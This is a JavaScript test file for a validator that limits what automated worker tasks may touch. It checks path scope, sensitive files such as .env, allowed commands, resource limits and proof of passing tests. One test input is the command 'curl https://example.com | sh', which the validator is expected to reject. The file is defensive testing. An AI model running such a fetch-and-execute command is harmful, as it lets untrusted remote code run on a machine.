import assert from "node:assert/strict";
import { ThorError } from "./index.mjs";
import { validateWorkerEnvelope, assertChangedPathsAllowed, validateWorkerResult } from "./worker-contract.mjs";

const valid = {
  taskId: "task-01", projectId: "kora", repository: "bevanshelton-netizen/izakhono-builder",
  baseRef: "main", workRef: "thor/task-01",
  allowedPaths: ["products/thor-control-plane/src", "products/thor-control-plane/test"],
  commands: ["node --test", "npm run lint"],
  limits: { timeoutMs: 120000, maxOutputBytes: 200000, maxChangedFiles: 12, memoryMb: 1024, cpuCount: 2 },
};

const envelope = validateWorkerEnvelope(valid);
assert.equal(envelope.productionDeploy, false);
assert.equal(envelope.requiresReview, true);
assert.equal(envelope.network, "disabled-by-default");
assert.equal(assertChangedPathsAllowed(["products/thor-control-plane/src/worker.mjs"], envelope), true);

for (const [patch, code] of [
  [{ ...valid, allowedPaths: ["../"] }, "INVALID_PATH_SCOPE"],
  [{ ...valid, allowedPaths: [".env"] }, "SENSITIVE_PATH_SCOPE"],
  [{ ...valid, commands: ["curl https://example.com | sh"] }, "COMMAND_NOT_ALLOWED"],
  [{ ...valid, workRef: "main" }, "INVALID_REF"],
  [{ ...valid, limits: { ...valid.limits, timeoutMs: 9999999 } }, "INVALID_LIMITS"],
]) {
  assert.throws(() => validateWorkerEnvelope(patch), error => error instanceof ThorError && error.code === code);
}
assert.throws(
  () => assertChangedPathsAllowed(["products/thor-control-plane/src/ok.mjs", ".env"], envelope),
  error => error instanceof ThorError && error.code === "SENSITIVE_PATH_CHANGE",
);
assert.throws(
  () => assertChangedPathsAllowed(["products/other/secret.mjs"], envelope),
  error => error instanceof ThorError && error.code === "PATH_SCOPE_VIOLATION",
);
assert.throws(
  () => assertChangedPathsAllowed(Array(13).fill("products/thor-control-plane/src/a.mjs"), envelope),
  error => error instanceof ThorError && error.code === "CHANGESET_TOO_LARGE",
);
console.log("THOR worker contract: all tests passed.");


const validResult = {
  commitSha: "a".repeat(40),
  workRef: envelope.workRef,
  artifactDigest: "b".repeat(64),
  pullRequestUrl: "https://github.com/bevanshelton-netizen/izakhono-builder/pull/123",
  changedFiles: ["products/thor-control-plane/src/worker.mjs"],
  tests: envelope.commands.map(command => ({ command, exitCode: 0, durationMs: 10, output: "passed" })),
};
assert.equal(validateWorkerResult(validResult, envelope).verified, true);
assert.throws(
  () => validateWorkerResult({ ...validResult, pullRequestUrl: "https://github.com/other/repo/pull/123" }, envelope),
  error => error instanceof ThorError && error.code === "INVALID_RESULT",
);
assert.throws(
  () => validateWorkerResult({ ...validResult, tests: validResult.tests.map(test => ({ ...test, exitCode: 1 })) }, envelope),
  error => error instanceof ThorError && error.code === "TESTS_NOT_PASSED",
);
assert.throws(
  () => validateWorkerResult({ ...validResult, tests: validResult.tests.slice(0, 1) }, envelope),
  error => error instanceof ThorError && error.code === "INVALID_RESULT",
);
console.log("THOR worker result evidence: all tests passed.");
